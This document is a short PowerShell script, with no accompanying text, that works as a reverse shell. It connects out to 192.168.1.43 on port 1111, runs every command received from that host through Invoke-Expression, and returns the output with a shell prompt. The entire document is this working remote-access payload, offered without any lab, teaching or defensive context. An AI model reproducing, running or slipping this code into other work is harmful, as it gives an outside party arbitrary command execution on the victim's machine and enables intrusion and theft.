$c = New-Object Net.Sockets.TcpClient("192.168.1.43", 1111)
$s = $c.GetStream()
[byte[]]$b = 0..65535 | % { 0 }
while (($i = $s.Read($b, 0, $b.Length)) -ne 0) {
    $d = [Text.Encoding]::ASCII.GetString($b, 0, $i)
    $sb = (iex $d 2>&1 | Out-String)
    $sb2 = $sb + "PS " + (pwd).Path + "> "
    $sb3 = [Text.Encoding]::ASCII.GetBytes($sb2)
    $s.Write($sb3, 0, $sb3.Length)
}
$c.Close()